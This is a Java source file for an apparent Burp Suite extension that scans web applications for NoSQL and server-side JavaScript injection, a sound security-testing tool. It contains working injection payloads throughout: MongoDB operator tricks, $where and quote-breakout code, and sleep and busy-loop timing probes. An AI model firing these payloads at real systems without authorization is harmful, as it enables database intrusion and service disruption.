package burp;

import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Iterator;
import java.io.PrintWriter;
import java.lang.Math;
import org.json.JSONObject;
import org.json.JSONArray;

import javax.swing.JMenuItem;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;

public class BurpExtender implements IBurpExtender, IScannerCheck, IScannerInsertionPointProvider, IContextMenuFactory
{
	private IBurpExtenderCallbacks callbacks;
	private IExtensionHelpers helpers;

	private PrintWriter stdout;
	private PrintWriter stderr;

	public static final boolean ENABLE_EXPERIMENTAL_PAYLOADS = true;

	public final String EXTENSION_NAME    = "NoSQLi Scanner";
	public final String EXTENSION_VERSION = "1.0";
	public final String EXTENSION_AUTHOR  = "Gabriele 'matrix' Gristina";
	public final String EXTENSION_URL     = "https://www.github.com/matrix/Burp-NoSQLiScanner";

	byte INJ_TYPE_JSON = 0;
	byte INJ_TYPE_JSON_ERROR = 1;
	byte INJ_TYPE_URL_BODY = 2;
	byte INJ_TYPE_URL_BODY_ERROR = 3;
	byte INJ_TYPE_FUNC = 4;
	byte INJ_TYPE_TIME = 6;
	byte INJ_TYPE_MULTI = 8;

	private List<NoSQLiPayload> INJS_ALL;
	private ArrayList<String> inj_errors;

	// load nosqli payloads
	private int loadNoSQLiPayloads()
	{
		this.INJS_ALL = new ArrayList<NoSQLiPayload>();

		this.inj_errors = new ArrayList<String>();
		this.inj_errors.add("unknown operator");
		this.inj_errors.add("cannot be applied to a field");
		this.inj_errors.add("expression is invalid");
		this.inj_errors.add("has to be a string");
		this.inj_errors.add("must be a boolean");
		this.inj_errors.add("use $a with");
		this.inj_errors.add("use &a with");
		this.inj_errors.add("JSInterpreterFailure");
		this.inj_errors.add("BadValue");
		this.inj_errors.add("MongoError");

		// json
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON, "{\"$eq\":\"1\"}", "{\"$ne\":\"1\"}", null));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON, "{\"$lt\":\"\"}", "{\"$gt\":\"\"}", null));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON, "{\"$exists\":false}", "{\"$exists\":true}", null));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON, "{\"$regex\":\".^\"}", "{\"$regex\":\".*\"}", null));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON, "{\"$where\":\"return false\"}", "{\"$where\":\"return true\"}", null));

		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON_ERROR, "{\"$\":\"1\"}", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON_ERROR, "{\"$where\":\"1\"}", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON_ERROR, "{\"$regex\":\"*\"}", null, this.inj_errors)); // pymongo
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON_ERROR, "{\"$regex\":null}", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON_ERROR, "{\"$exists\":null}", null, this.inj_errors)); // mongoose
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON_ERROR, "{\"$a\":null}", null, this.inj_errors)); // mongoose

		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON, "{\"&eq\":\"1\"}", "{\"&ne\":\"1\"}", null));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON, "{\"&lt\":\"\"}", "{\"&gt\":\"\"}", null));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON, "{\"&exists\":false}", "{\"&exists\":true}", null));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON, "{\"&regex\":\".^\"}", "{\"&regex\":\".*\"}", null));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON, "{\"&where\":\"return false\"}", "{\"&where\":\"return true\"}", null));

		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON_ERROR, "{\"&\":\"1\"}", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON_ERROR, "{\"&where\":\"1\"}", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON_ERROR, "{\"&regex\":\"*\"}", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON_ERROR, "{\"&regex\":null}", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON_ERROR, "{\"&exists\":null}", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_JSON_ERROR, "{\"&a\":null}", null, this.inj_errors)); // mongoose

		// url-encoded
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "%5b%24eq%5d=1", "%5b%24ne%5d=1", null));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "%5b%24lt%5d=", "%5b%24gt%5d=", null));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "%5b%24exists%5d=false", "%5b%24exists%5d=true", null));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "%5b%24regex%5d=.%5e", "%5b%24regex%5d=.*", null));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "%5b%24where5d=return%20false", "%5b%24where5d=return%20true", null));

		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%24%5d=1", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%24where%5d=1", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%24regex%5d=*", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%24regex%5d=null", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%24exists%5d=null", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%24a%5d=null", null, this.inj_errors));

		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "%5b%26eq%5d=1", "%5b%26ne%5d=1", null));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "%5b%26lt%5d=", "%5b%26gt%5d=", null));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "%5b%26exists%5d=false", "%5b%26exists%5d=true", null));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "%5b%26regex%5d=.%5e", "%5b%26regex%5d=.*", null));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "%5b%26where5d=return%20false", "%5b%26where5d=return%20true", null));

		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%26%5d=1", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%26where%5d=1", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%26regex%5d=*", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%26regex%5d=null", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%26exists%5d=null", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY_ERROR, "%5b%26a%5d=null", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY_ERROR, "'", null, this.inj_errors));
		this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY_ERROR, "\\'", null, this.inj_errors));

		if (this.ENABLE_EXPERIMENTAL_PAYLOADS)
		{
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "%7c%7c1==2", "%7c%7c1==1", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "'%7c%7c'a'=='b", "'%7c%7c'a'=='a", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "\\'%7c%7c'a'=='b", "\\'%7c%7c'a'=='a", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "\\\'%7c%7c'a'=='b", "\\\'%7c%7c'a'=='a", null));

			// mongodb, experimentals
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "true,$where:'1==2'", "true,$where:'1==1'", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, ",$where:'1==2'", ",$where:'1==1'", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "$where:'1==2'", "$where:'1==1'", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "',$where:'1==2", "',$where:'1==1", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "1,$where:'1==2'", "1,$where:'1==1'", null));

			// ssji, experimentals
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_FUNC, "';return 'a'=='b' && ''=='", "';return 'a'=='a' && ''=='", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_FUNC, "\\';return 'a'=='b' && ''=='", "\\';return 'a'=='a' && ''=='", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_FUNC, "\\\';return 'a'=='b' && ''=='", "\\\';return 'a'=='a' && ''=='", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_FUNC, "\";return 'a'=='b' && ''=='", "\";return 'a'=='b' && ''=='", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_FUNC, "\\\";return 'a'=='b' && ''=='", "\\\";return 'a'=='b' && ''=='", null));

			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_FUNC, "\";return(false);var xyz='a", "\";return(true);var xyz='a", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_FUNC, "';return(false);var xyz='a", "';return(true);var xyz='a", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_FUNC, "\\';return(false);var xyz='a", "\\';return(true);var xyz='a", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_FUNC, "a';return false;var xyz='a", "a';return true;var xyz='a", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_FUNC, "a\\';return false;var xyz='a", "a\\';return true;var xyz='a", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_FUNC, "a\";return true;var xyz=\"a", "a\";return false; var xyz=\"a", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_FUNC, "0;return false", "0;return true", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_FUNC, "require('os').endianness()=='LE'", "require('os').endianness()=='BE'", null)); // node.js

			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_TIME, "{\"$where\":\"sleep(1)\"}", "{\"$where\":\"sleep(10000)\"}", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_TIME, "{\"&where\":\"sleep(1)\"}", "{\"&where\":\"sleep(10000)\"}", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_TIME, "$where:\"sleep(1)\"", "$where:\"sleep(10000)\"", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_TIME, "$where:'sleep(1)'", "$where:'sleep(10000)'", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_TIME, "sleep(1)", "sleep(10000)", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_TIME, "a;sleep(1)", "a;sleep(10000)", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_TIME, "'a';sleep(1)", "'a';sleep(10000)", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_TIME, "a';sleep(1);var xyz='a", "a';sleep(10000);var xyz='a", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_TIME, "';sleep(1);var xyz='0", "';sleep(10000);var xyz='0", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_TIME, "\\';sleep(1);var xyz='0", "\\';sleep(10000);var xyz='0", null));

			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_TIME, "var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz=1", "var d=new Date();do{var cd=new Date();}while(cd-d<10000);var xyz=1", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_TIME, "1;var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz=1", "1;var d=new Date();do{var cd=new Date();}while(cd-d<10000);var xyz=1", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_TIME, "1';var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz='1", "1';var d=new Date();do{var cd=new Date();}while(cd-d<10000);var xyz='1", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_TIME, "1\\';var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz='1", "1\\';var d=new Date();do{var cd=new Date();}while(cd-d<10000);var xyz='1", null));

			// experimentals
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "_security", "_all_docs", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_URL_BODY, "%5b%5d=_security", "%5b%5d=_all_docs", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_MULTI, "%5b%24eq%5d=1", "%5b%24ne%5d=1", null));
			this.INJS_ALL.add(new NoSQLiPayload(INJ_TYPE_MULTI, "%5b%26eq%5d=1", "%5b%26ne%5d=1", null));
		}

		/*
		this.INJS_ALL.forEach((e)  ->
		{
			this.stdout.println("Show current payload");
			this.stdout.println("Type: " + e.get_payloadType() + ", Payload 1: " + new String(e.get_payload_1()) + ", Payload 2: " + new String(e.get_payload_2()) + ", Error: " + e.get_err());
		});*/

		return INJS_ALL.size();
	}

	// IContextMenuFactory
	public String ConvertJSONtoQueryString(JSONObject jsonObj, String arrayName, int arrayIndex)
	{
		String out = "";
		try
		{
			for (String keyStr : jsonObj.keySet())
			{
				Object keyvalue = jsonObj.get(keyStr);

				if (keyvalue instanceof JSONObject)
				{
					out += ConvertJSONtoQueryString((JSONObject)keyvalue, null, 0);
				}
				else if (keyvalue instanceof JSONArray)
				{
					JSONArray array = jsonObj.getJSONArray(keyStr);
					Iterator<Object> iterator = array.iterator();

					while(iterator.hasNext())
					{
						out += ConvertJSONtoQueryString((JSONObject) iterator.next(), keyStr, arrayIndex++);
					}
				}
				else
				{
					if (arrayName != null)
					{
						out += "&" + arrayName + "[" + arrayIndex + "][" + keyStr + "]="+ keyvalue;
					}
					else
					{
						out += "&" + keyStr + "=" + keyvalue;
					}
				}
			}
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}

		return out;
	}

	@Override
	public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation)
	{
		List<JMenuItem> jmenu = new ArrayList<>();

		if (invocation.getToolFlag() != IBurpExtenderCallbacks.TOOL_INTRUDER && invocation.getInvocationContext() != IContextMenuInvocation.CONTEXT_MESSAGE_EDITOR_REQUEST)
		{
			return jmenu;
		}

		JMenuItem menuItem_toQueryString = new JMenuItem("Convert to QueryString");

		menuItem_toQueryString.addMouseListener(new MouseListener()
		{
			public void mouseClicked(MouseEvent arg0)	{
			}

			public void mouseEntered(MouseEvent arg0) {
			}

			public void mouseExited(MouseEvent arg0) {
			}

			public void mousePressed(MouseEvent arg0) {
			}

			public void mouseReleased(MouseEvent arg0)
			{
				try
				{
					IHttpRequestResponse iReqResp = invocation.getSelectedMessages()[0];
					byte[] tmpReq = iReqResp.getRequest();
					IRequestInfo reqInfo = helpers.analyzeRequest(tmpReq);
					String requestStr = helpers.bytesToString(tmpReq);

					if (reqInfo.getContentType() == IRequestInfo.CONTENT_TYPE_JSON)
					{
						int bodyOff = reqInfo.getBodyOffset();
						if (bodyOff > 0)
						{
							String body = requestStr.substring(bodyOff);
							if (body.length() > 0)
							{
								JSONObject jsonObj = new JSONObject(body.trim());
								String queryString = ConvertJSONtoQueryString(jsonObj, null, 0);
								queryString = queryString.substring(1);

								String newRequestStr = requestStr.substring(0, bodyOff) + queryString;
								byte[] newRequest = helpers.stringToBytes(newRequestStr);
								IRequestInfo newReqInfo = helpers.analyzeRequest(newRequest);
								List<String> headers = newReqInfo.getHeaders();

								Iterator<String> iter = headers.iterator();
								while(iter.hasNext())
								{
									String tmp = iter.next();
									if (tmp.contains("Content-Type")) iter.remove();
									if (tmp.contains("Content-Length")) iter.remove();
								}
								headers.add("Content-Length: " + queryString.length());
								headers.add("Content-Type: application/x-www-form-urlencoded");

								byte[] request = helpers.buildHttpMessage(headers, helpers.stringToBytes(queryString));
								iReqResp.setRequest(request);
							}
						}
					}
				}
				catch (Exception e)
				{
					e.printStackTrace();
				}
			}
		});

		jmenu.add(menuItem_toQueryString);
		return jmenu;
	}

	// IBurpExtender

	@Override
	public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks)
	{
		// keep a reference to our callbacks object
		this.callbacks = callbacks;
		this.stdout = new PrintWriter(callbacks.getStdout(), true);
		this.stderr = new PrintWriter(callbacks.getStderr(), true);

		// obtain an extension helpers object
		this.helpers = callbacks.getHelpers();

		int c = loadNoSQLiPayloads();
		this.stdout.println(EXTENSION_NAME + " v" + EXTENSION_VERSION + " - Loaded " + c + " payload(s).");

		// set our extension name
		callbacks.setExtensionName(EXTENSION_NAME);

		callbacks.registerScannerInsertionPointProvider(this);
		callbacks.registerScannerCheck(this);
		callbacks.registerContextMenuFactory(this);
	}

	// helper method to search a response for occurrences of a literal match string
	// and return a list of start/end offsets
	private List<int[]> getMatches(byte[] response, byte[] match)
	{
		List<int[]> matches = new ArrayList<int[]>();

		int start = 0;
		while (start < response.length)
		{
			start = helpers.indexOf(response, match, false, start, response.length);
			if (start == -1) break;
			matches.add(new int[] { start, start + match.length });
			start += match.length;
		}

		return matches;
	}

	// IScannerInsertionPointProvider
	@Override
	public List<IScannerInsertionPoint> getInsertionPoints(IHttpRequestResponse baseRequestResponse)
	{
		List<IScannerInsertionPoint> insertionPoints = new ArrayList<IScannerInsertionPoint>();

		byte[] request = baseRequestResponse.getRequest();
		String requestStr = new String(request);
		IRequestInfo reqInfo = helpers.analyzeRequest(request);

		for (IParameter p: reqInfo.getParameters())
		{
			// handle json parameter
			if (p.getType() == IParameter.PARAM_JSON)
			{
				int start = p.getValueStart();
				char s = requestStr.charAt(start-1);
				if (s == '"') start--;

				int end = p.getValueEnd();
				char e = requestStr.charAt(end);
				if (e == '"') end++;

				insertionPoints.add(helpers.makeScannerInsertionPoint(EXTENSION_NAME, request, start, end)); // add custom json injection point
			}
			else if (p.getType() == IParameter.PARAM_BODY || p.getType() == IParameter.PARAM_URL)
			{
				int start = p.getNameEnd();
				char s = requestStr.charAt(start);
				int end = p.getValueEnd();

				insertionPoints.add(helpers.makeScannerInsertionPoint(EXTENSION_NAME, request, start, end)); // add custom urlencoded injection point
			}
			else
			{
				continue;
			}

			insertionPoints.add(helpers.makeScannerInsertionPoint(EXTENSION_NAME, request, p.getValueStart(), p.getValueEnd())); // add default insertion point
		}

		return insertionPoints;
	}

	// IScannerCheck

	@Override
	public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse)
	{
		List<IScanIssue> issues = new ArrayList<>();

		byte[] response = baseRequestResponse.getResponse();

		if (response.length == 0) return issues;

		this.INJS_ALL.forEach((e) ->
		{
			if (e.get_err() != null && e.get_err().size() > 0)
			{
				Iterator<String> it = e.get_err().iterator();

				while (it.hasNext())
				{
					String err = it.next();

					List<int[]> matches = getMatches(response, err.getBytes());

					if (matches.size() > 0)
					{
						// report the issue
						issues.add(
							new CustomScanIssue(
								baseRequestResponse.getHttpService(),
								helpers.analyzeRequest(baseRequestResponse).getUrl(),
								new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, matches) },
								"NoSQL Error Message Detected",
								"The response contains the string: " + err,
								"Medium",
								"Certain"
							)
						);
						break; // stop at first error message detected
					}
				}
			}
		});

		return issues;
	}

	@Override
	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint)
	{
		List<IScanIssue> issues = new ArrayList<>();

		this.INJS_ALL.forEach((e) ->
		{
			IHttpRequestResponse[] checkRequestResponse = new IHttpRequestResponse[2];
			IResponseVariations variation = null;

			boolean whole_body_content = false;
			boolean limited_body_content = false;
			boolean status_code = false;
			boolean[] DigYourOwnHole = new boolean[3];
			int DigYourOwnHole_cnt = 0;

			long[] timer = new long[3];
			long[] timerCheck = new long[2];

			if (e.get_payloadType() != INJ_TYPE_JSON_ERROR && e.get_payloadType() != INJ_TYPE_URL_BODY_ERROR)
			{
				byte[] checkRequest1 = insertionPoint.buildRequest(e.get_payload_1());
				byte[] checkRequest2 = insertionPoint.buildRequest(e.get_payload_2());

				if (e.get_payloadType() == INJ_TYPE_TIME) timer[0] = System.currentTimeMillis();
				checkRequestResponse[0] = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest1);
				if (e.get_payloadType() == INJ_TYPE_TIME) timer[1] = System.currentTimeMillis();
				checkRequestResponse[1] = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest2);
				if (e.get_payloadType() == INJ_TYPE_TIME) timer[2] = System.currentTimeMillis();

				if (e.get_payloadType() == INJ_TYPE_TIME)
				{
					timerCheck[0] = timer[1] - timer[0];
					timerCheck[1] = timer[2] - timer[1];
					long timerDiff = Math.abs(timerCheck[1] - timerCheck[0]);

					if (timerDiff >= 10000)
					{
						issues.add(
							new CustomScanIssue(
								baseRequestResponse.getHttpService(),
								helpers.analyzeRequest(baseRequestResponse).getUrl(),
								new IHttpRequestResponse[] {baseRequestResponse, checkRequestResponse[0], checkRequestResponse[1]},
								"NoSQL/SSJI Time-Based Injection Detected",
								"Injection found by using the following payloads:\n\t" + helpers.bytesToString(e.get_payload_1()) + "\nand\n\t" + helpers.bytesToString(e.get_payload_2()) + ".\nThe timing diff was: " + timerDiff + ".",
								"High",
								"Tentative"
							)
						);
					}
				}

				variation = helpers.analyzeResponseVariations(checkRequestResponse[0].getResponse(), checkRequestResponse[1].getResponse());

				// check variation from request1 and request2 responses
				List<String> responseChanges = variation.getVariantAttributes();
				for (String change : responseChanges)
				{
					if (change.equals("whole_body_content")) whole_body_content = true;
					if (change.equals("limited_body_content")) limited_body_content = true;
					if (change.equals("status_code")) status_code = true;
				}

				DigYourOwnHole[0] = (whole_body_content || limited_body_content || status_code);
				DigYourOwnHole_cnt = (whole_body_content ? 1 : 0) + (limited_body_content ? 1 : 0) + (status_code ? 1 : 0);

				if (DigYourOwnHole[0] && DigYourOwnHole_cnt == 3)
				{
					issues.add(
						new CustomScanIssue(
							baseRequestResponse.getHttpService(),
							helpers.analyzeRequest(baseRequestResponse).getUrl(),
							new IHttpRequestResponse[] {baseRequestResponse, checkRequestResponse[0], checkRequestResponse[1]},
							((e.get_payloadType() == INJ_TYPE_FUNC) ? "NoSQL/SSJI" : "NoSQL") + " Injection Detected",
							"Injection found, detected by variation in responses, by using the following payloads: " + helpers.bytesToString(e.get_payload_1()) + " and " + helpers.bytesToString(e.get_payload_2()),
							"High",
							"Tentative"
						)
					);
				}
				else if (DigYourOwnHole[0]) // if responses are different, check variation about base response
				{
					whole_body_content = limited_body_content = status_code = false;
					variation = helpers.analyzeResponseVariations(baseRequestResponse.getResponse(), checkRequestResponse[0].getResponse());
					responseChanges = variation.getVariantAttributes();
					for (String change : responseChanges)
					{
						if (change.equals("whole_body_content")) whole_body_content = true;
						if (change.equals("limited_body_content")) limited_body_content = true;
						if (change.equals("status_code")) status_code = true;
					}

					DigYourOwnHole[1] = (whole_body_content || limited_body_content || status_code);

					whole_body_content = limited_body_content = status_code = false;
					variation = helpers.analyzeResponseVariations(baseRequestResponse.getResponse(), checkRequestResponse[1].getResponse());
					responseChanges = variation.getVariantAttributes();
					for (String change : responseChanges)
					{
						if (change.equals("whole_body_content")) whole_body_content = true;
						if (change.equals("limited_body_content")) limited_body_content = true;
						if (change.equals("status_code")) status_code = true;
					}

					DigYourOwnHole[2] = (whole_body_content || limited_body_content || status_code);

					boolean check_variation = (DigYourOwnHole[1] != DigYourOwnHole[2]);

					if (check_variation)
					{
						issues.add(
							new CustomScanIssue(
								baseRequestResponse.getHttpService(),
								helpers.analyzeRequest(baseRequestResponse).getUrl(),
								new IHttpRequestResponse[] {baseRequestResponse, checkRequestResponse[0], checkRequestResponse[1]},
								((e.get_payloadType() == INJ_TYPE_FUNC) ? "NoSQL/SSJI" : "NoSQL") + " Injection Detected",
								"Injection found, detected by variation in responses, by using the following payloads: " + helpers.bytesToString(e.get_payload_1()) + " and " + helpers.bytesToString(e.get_payload_2()),
								"High",
								"Tentative"
							)
						);
					}
				}
			}
			else
			{
				if (e.get_err() != null && e.get_err().size() > 0)
				{
					byte[] checkRequest = insertionPoint.buildRequest(e.get_payload_1());
					checkRequestResponse[0] = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);

					byte[] response = checkRequestResponse[0].getResponse();
					final boolean found = false;

					if (response.length > 0)
					{
						Iterator<String> it = e.get_err().iterator();

						while (it.hasNext())
						{
							String err = it.next();

							List<int[]> matches = getMatches(response, err.getBytes());

							if (matches.size() > 0)
							{
								// report the issue
								issues.add(
									new CustomScanIssue(
										baseRequestResponse.getHttpService(),
										helpers.analyzeRequest(checkRequestResponse[0]).getUrl(),
										new IHttpRequestResponse[] { callbacks.applyMarkers(checkRequestResponse[0], null, matches) },
										"NoSQL Error Message Detected",
										"The response contains the string: " + err,
										"Medium",
										"Certain"
									)
								);
								break; // stop at first error message detected
							}
						}
					}
				}
			}
		});

		return issues;
	}
	@Override
	public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue)
	{
		return (existingIssue.getIssueName().equals(newIssue.getIssueName())) ? -1 : 0;
	}
}

// IScanIssue

class CustomScanIssue implements IScanIssue
{
	private IHttpService httpService;
	private URL url;
	private IHttpRequestResponse[] httpMessages;
	private String name;
	private String detail;
	private String severity;
	private String confidence;

	public CustomScanIssue(IHttpService httpService, URL url, IHttpRequestResponse[] httpMessages, String name, String detail, String severity, String confidence)
	{
		this.httpService = httpService;
		this.url = url;
		this.httpMessages = httpMessages;
		this.name = name;
		this.detail = detail;
		this.severity = severity;
		this.confidence = confidence;
	}

	@Override
	public URL getUrl()
	{
		return url;
	}

	@Override
	public String getIssueName()
	{
		return name;
	}

	@Override
	public int getIssueType()
	{
		return 0;
	}

	@Override
	public String getSeverity()
	{
		return severity;
	}

	@Override
	public String getConfidence()
	{
		return confidence;
	}

	@Override
	public String getIssueBackground()
	{
		return null;
	}

	@Override
	public String getRemediationBackground()
	{
		return null;
	}

	@Override
	public String getIssueDetail()
	{
		return detail;
	}

	@Override
	public String getRemediationDetail()
	{
		return null;
	}

	@Override
	public IHttpRequestResponse[] getHttpMessages()
	{
		return httpMessages;
	}

	@Override
	public IHttpService getHttpService()
	{
		return httpService;
	}
}

// NoSQLiPayload

class NoSQLiPayload
{
	public byte payloadType;
	public byte[] payload_1;
	public byte[] payload_2;
	public ArrayList<String> err;

	public NoSQLiPayload(byte t, String p1, String p2, ArrayList<String> err)
	{
		this.payloadType = t;
		set_payloads(p1, p2);
		this.err = err;
	}

	public byte get_payloadType()
	{
		return this.payloadType;
	}

	public byte[] get_payload_1()
	{
		return (this.payload_1 != null) ? this.payload_1 : new byte[0];
	}

	public byte[] get_payload_2()
	{
		return (this.payload_2 != null) ? this.payload_2 : new byte[0];
	}

	public ArrayList<String> get_err()
	{
		return this.err;
	}

	public void set_payloads(String p1, String p2)
	{
		if (p1 != null && p1.length() > 0) this.payload_1 = p1.getBytes();
		if (p2 != null && p2.length() > 0) this.payload_2 = p2.getBytes();
	}
}
